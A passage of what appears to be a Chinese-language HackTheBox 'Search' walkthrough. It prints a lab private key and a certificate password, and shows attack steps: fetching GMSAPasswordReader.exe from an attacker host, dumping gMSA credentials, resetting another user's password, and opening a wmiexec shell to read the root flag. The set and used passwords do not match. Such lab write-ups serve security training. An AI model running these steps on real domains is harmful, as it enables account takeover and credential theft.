-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDfHhzAHlrcxe2H
s68dBCYOk17lclVdJ5uwOArrwDmAEo0YKMng6AvvpxV1Bi1i0Ifk1h3jc+Ixp5E6
WjrXThYuJCRMDhQaDZXVzig9LUXrPDpQGyErZUWj4YX2pyNO3boy7RrS9JiuZzBe
QXnmr1MUBxA7zpWVZwIRqibCjtTGJ/y/vG3MFoEVVwR5F21wdqulCTPnxqv3bvU2
zNT7EcnKxmK7PO34ZBXrh2XN9nZT+m0IQBfQLbpLWQzYFvDekgai+DXIPJJcjrUI
vFWzKIRWA33XvtoFdlyXO/JCcTVLxPEX48IEYNLXhW9DE8bcmt88gp7gVkbw0GKW
bkUrF47BAgMBAAECggEAJvwA9ASZxbeDsFFSCJTf/W38h8S5a6RvDJROPDEDGwCi
zJTb6UNCSqZ8Fk11Aq4DAJX09PgbjqeDtZlsbJBFSdygxvUyx/aVtpzl5QKTE+4b
FkIXQpjYWTEfkiBUCASv8xQAutloEBkRl3aDUS5TKs2tJXYMJuWvs9xyF06TmOey
LCZgqevBVCTQMI/iiltiDoPsAUmIPC4v7Y7b0reCIwnCWk5Wblw89/FHwNh9rTci
Aun6eUOfXHP03PIZtkBPxNHl25hM70IFgvViIekKaYGJHU+c38lYP/XphORPbpN+
lznmYK0jgDpFsxeVxYmggRfV4a1UVHTzaD3t2jqPXQKBgQDmd6nOJ0e+nGGzUOmC
Nn+lZ4PzkCAlMQUHAemjSjDRnJDilRxCDNqJu2qWjc2ek2lEitDKAKPP3WTHrIPd
DKJ7RbYJQ7arqXlql2fStWgUt/SK8PfuopZ2oP3jHwcQQ2712M5675KZUC4k+buK
2LIvGFQxdjeP+LldGqsi2vguEwKBgQD31f/e+NXAZUgd3RVemdohihc5pznuW39S
qIpdXKflxOn5DKYIH5yzD6sRgujTVQ+IQzg7bbTH4zoxbpOfIrU3gObPxgAnrSMt
2YMT1Hp5+nrTXEO6xmvp9PEwI+7BA4fr2Ws5NSSxurht3osH1VUMGSyvJwZHgZif
d9enpDHaWwKBgQC6JOqUpKtQ7DQJRg/kaSo+KVatMbqU73vVBhl0FudJVgC70Z2q
R4F3f1V+1ne+XefHQauTjGLC8FmG4PL8ZkkR8eMupm9zRQXZLwLfcD/phA7S7gAC
0XVfyXZmrFfjLeQAU6WqK7gndlhe6wosAgwg97CA5q/H7CejaHfTRjLv2wKBgQCW
kK01QgliLGXmtrTP1zpdG+7GOOEJ/Q5aIkiFNdBO2BWpF1UbJFFnu4IbTmOyWD/q
caQM/rZQpaxp8Zq/mC9t++K9obXgZOA1b6qhdnm99z19gNUo+HkBFq0cqQfYvRNr
Zpgsliunyh9XqFbguGtFwVmTQ2seMA6P+xfKIgejdwKBgQDH1YWfmhNqfMsiFMEQ
BQGUAgWiszRqJmqCJIv4AUJpUpWXoauhS9os7cMyuVDNyywh9ML1+Y5jnhnITebw
cGpia/Gp6zW78rEsRjZVJkNoFDLSDnbfVBNQ8OhDenUDKaPSwXDgIg0TGimtk+PP
zy005IeKPTJ6nv7yu0Qm50Ifsg==
-----END PRIVATE KEY-----

~~~

从私钥导出公钥

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ openssl rsa -in key.pem -pubout -out staff_pub.pem  
writing RSA key
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Search]
└─$ cat staff_pub.pem 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3x4cwB5a3MXth7OvHQQm
DpNe5XJVXSebsDgK68A5gBKNGCjJ4OgL76cVdQYtYtCH5NYd43PiMaeROlo6104W
LiQkTA4UGg2V1c4oPS1F6zw6UBshK2VFo+GF9qcjTt26Mu0a0vSYrmcwXkF55q9T
FAcQO86VlWcCEaomwo7Uxif8v7xtzBaBFVcEeRdtcHarpQkz58ar9271NszU+xHJ
ysZiuzzt+GQV64dlzfZ2U/ptCEAX0C26S1kM2Bbw3pIGovg1yDySXI61CLxVsyiE
VgN9177aBXZclzvyQnE1S8TxF+PCBGDS14VvQxPG3JrfPIKe4FZG8NBilm5FKxeO
wQIDAQAB
-----END PUBLIC KEY-----
~~~


...似乎不需要导出

直接把ca证书导入到浏览器即可，提示要密码就输入misspissy

![](Pasted_image_20250206211049.png)

再次尝试访问443端口的服务

![](Pasted_image_20250206211720.png)

成功登陆进webshell

## 权限提升

### gMSA 账户利用与域管理员提权

查找提权路径

![](Pasted_image_20250206212406.png)

上传GMSAPasswordReader.exe

~~~
PS C:\programdata> 

iwr http://10.10.16.4/GMSAPasswordReader.exe -outfile GMSAPasswordReader.exe

PS C:\programdata> 

dir

 

 

    Directory: C:\programdata

 

 

Mode                LastWriteTime         Length Name                                                                  

----                -------------         ------ ----                                                                  

d-----        7/13/2023   2:59 PM                Corefig                                                               

d---s-        7/30/2020   3:52 PM                Microsoft                                                             

d-----        4/13/2022  12:20 PM                Package Cache                                                         

d-----        4/13/2022  11:55 AM                regid.1991-06.com.microsoft                                           

d-----        9/15/2018   8:12 AM                SoftwareDistribution                                                  

d-----        3/23/2020   1:31 PM                ssh                                                                   

d-----        3/22/2020  11:51 PM                USOPrivate                                                            

d-----        3/22/2020  11:51 PM                USOShared                                                             

d-----       12/16/2021   5:08 PM                VMware                                                                

-a----         2/6/2025   1:15 PM         105472 GMSAPasswordReader.exe                                                
~~~

但是hash难以利用

~~~
PS C:\programdata> 

.\GMSAPasswordReader.exe --accountname BIR-ADFS-GMSA$

Calculating hashes for Current Value

[*] Input username             : BIR-ADFS-GMSA$

[*] Input domain               : SEARCH.HTB

[*] Salt                       : SEARCH.HTBBIR-ADFS-GMSA$

[*]       rc4_hmac             : E1E9FD9E46D0D747E1595167EEDCEC0F

[*]       aes128_cts_hmac_sha1 : BBCD2446765F390C680CDA31A9FC1783

[*]       aes256_cts_hmac_sha1 : ECAED51920F8677C5846154F69267FE4875543727C7032690016F7947A8A6F94

[*]       des_cbc_md5          : 3843029E088FB983
~~~

尝试使用powershell进行利用
创建一个gmsa对象并且获取他的密码，这里的密码用的是unicode所以看起来是乱码
~~~
PS C:\programdata> 

$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA$' -Properties 'msDS-ManagedPassword'

PS C:\programdata> 

$mp = $gmsa.'msDS-ManagedPassword'

PS C:\programdata> 

ConvertFrom-ADManagedPasswordBlob $mp


Version                   : 1

CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤

                            ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇

SecureCurrentPassword     : System.Security.SecureString

PreviousPassword          : 

SecurePreviousPassword    : 

QueryPasswordInterval     : 1885.10:30:41.5901687

UnchangedPasswordInterval : 1885.10:25:41.5901687
 
~~~

创建凭据对象用于更改TRISTAN.DAVIES的密码
~~~
PS C:\programdata> 

$password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword

PS C:\programdata> 

$SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword

PS C:\programdata> 

$cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass

PS C:\programdata> 

Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword

 (ConvertTo-SecureString -AsPlainText 'Lizisec123@' -force)} -Credential $cred
~~~

密码更改成功

~~~
(python3.9) ┌──(kali㉿kali)-[~/htb/Search/gMSADumper]
└─$ nxc smb 10.10.11.129 -u TRISTAN.DAVIES -p 'Lizisec123@'                                       
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\TRISTAN.DAVIES:Lizisec123@ (Pwn3d!)

~~~

使用wmi登录读取flag

~~~
(python3.9) ┌──(kali㉿kali)-[~/htb/Search/gMSADumper]
└─$ sudo impacket-wmiexec search.htb/TRISTAN.DAVIES:'Lzh123@'@10.10.11.129
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd users
C:\users>cd administrator
C:\users\administrator>cd desktop
C:\users\administrator\desktop>type root.txt
d44a308ca24bc74a3e3c5e293d7c65ab

C:\users\administrator\desktop>whoami
search\tristan.davies

~~~

